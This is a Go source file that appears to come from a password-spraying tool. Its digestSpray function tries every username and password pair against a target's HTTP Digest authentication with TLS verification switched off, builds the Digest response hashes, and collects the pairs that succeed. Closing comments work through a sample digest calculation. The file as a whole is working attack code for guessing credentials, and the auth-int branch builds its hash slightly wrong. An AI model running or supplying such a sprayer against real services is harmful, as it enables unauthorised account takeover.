package main

import (
	"crypto/md5"
	"crypto/tls"
	"encoding/hex"
	"fmt"
	"net/http"
	"strconv"
	"strings"
	"sync"
)



func digestSpray(wg *sync.WaitGroup, channelToCommunicate chan string,  taskToRun task) {
	defer wg.Done()
	for _,username := range taskToRun.usernames {
		for _,password := range taskToRun.passwords {
			http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
			client := &http.Client{}
			req, _ := http.NewRequest("GET", taskToRun.target.scheme+"://"+taskToRun.target.host+":"+strconv.Itoa(taskToRun.target.port)+"/"+taskToRun.target.url, nil)
			res, _ := client.Do(req)
			if res.StatusCode == 401 {
				authHeader := res.Header.Get("Www-Authenticate")
				qop := ""
				algorithm := ""
				HA1 := ""
				HA2 := ""
				response := ""
				nonce := ""
				realm := ""
				entityBody := "" // Is needed for auth-int
				cnonce := StringWithCharset(16, charset)
				authHeader = strings.Replace(authHeader,"Digest ","",1)
				authHeaderSlice := strings.Split(authHeader, ",")
				for _, authHeaderItem := range authHeaderSlice {
					authHeaderItem = strings.Trim(authHeaderItem, " ")
					authHeaderItemSlice := strings.Split(authHeaderItem, "=")
					authHeaderItemName := authHeaderItemSlice[0]
					authHeaderItemValueSlice := authHeaderItemSlice[1:]
					authHeaderItemValue := strings.Join(authHeaderItemValueSlice, "=")
					authHeaderItemValue = strings.Trim(authHeaderItemValue, "\"")

					if authHeaderItemName == "qop" {
						qop = authHeaderItemValue
					} else if authHeaderItemName == "algorithm" {
						algorithm = authHeaderItemValue
					} else if authHeaderItemName == "nonce" {
						nonce = authHeaderItemValue
					} else if authHeaderItemName == "realm" {
						realm = authHeaderItemValue
					}
				}

				if algorithm == "MD5-sess" {
					hash := md5.Sum([]byte(username + ":" + realm + ":" + password))
					hash1 := hex.EncodeToString(hash[:])
					hash = md5.Sum([]byte(hash1 + ":" + nonce + ":" + cnonce))
					HA1 = hex.EncodeToString(hash[:])
				} else {
					hash := md5.Sum([]byte(username + ":" + realm + ":" + password))
					HA1 = hex.EncodeToString(hash[:])
				}
				if qop == "auth-int" {
					hash := md5.Sum([]byte(entityBody))
					hash1 := hex.EncodeToString(hash[:])
					hash = md5.Sum([]byte("GET:/" + taskToRun.target.url + hash1))
					HA2 = hex.EncodeToString(hash[:])
				} else {
					hash := md5.Sum([]byte("GET:/" + taskToRun.target.url))
					HA2 = hex.EncodeToString(hash[:])
				}

				if qop == "auth-int" || qop == "auth" {
					hash := md5.Sum([]byte(HA1 + ":" + nonce + ":00000001:" + cnonce + ":" + qop + ":" + HA2))
					response = hex.EncodeToString(hash[:])
				} else {
					hash := md5.Sum([]byte(HA1 + ":" + nonce + ":" + HA2))
					response = hex.EncodeToString(hash[:])
				}
				headerValue := "Digest username=\"" + username + "\", realm=\"" + realm + "\", nonce=\"" + nonce + "\", uri=\"" + "/" + taskToRun.target.url + "\", algorithm=" + algorithm + ", response=\"" + response + "\", qop=" + qop + ", nc=00000001, cnonce=\"" + cnonce + "\""

				client = &http.Client{}
				req, _ = http.NewRequest("GET", taskToRun.target.scheme+"://"+taskToRun.target.host+":"+strconv.Itoa(taskToRun.target.port)+"/"+taskToRun.target.url, nil)
				req.Header.Set("Authorization", headerValue)
				res, _ = client.Do(req)

				if res.StatusCode == 401 {
					fmt.Print("-")
				} else {
					fmt.Print("+")
					channelToCommunicate <- username + ":" + password
				}
			}
		}
	}
}

//Authorization: Digest username="admin", realm="private", nonce="JzsNFY3aBQA=83ef09f1a0d191fc5fe395c0ebb6e6afc9e38865", uri="/1/", algorithm=MD5, response="1c03d4e473eb96e9c4fa7e454b5d2969", qop=auth, nc=00000002, cnonce="e9ee6d536ff81fdd"
//
//admin:private:456	31f0f4ba834d8053d34285467b40cbec
//GET:/1/				61952ea1383896fd01ea8ce134231f38
//
//31f0f4ba834d8053d34285467b40cbec:JzsNFY3aBQA=83ef09f1a0d191fc5fe395c0ebb6e6afc9e38865:00000002:e9ee6d536ff81fdd:auth:61952ea1383896fd01ea8ce134231f38	1c03d4e473eb96e9c4fa7e454b5d2969
//
//HA1 = MD5(username:realm:password)
//HA2 = MD5(GET:/dir/index.html)
//response = MD5(HA1:nonce,nc,cnonce,qop,HA2)

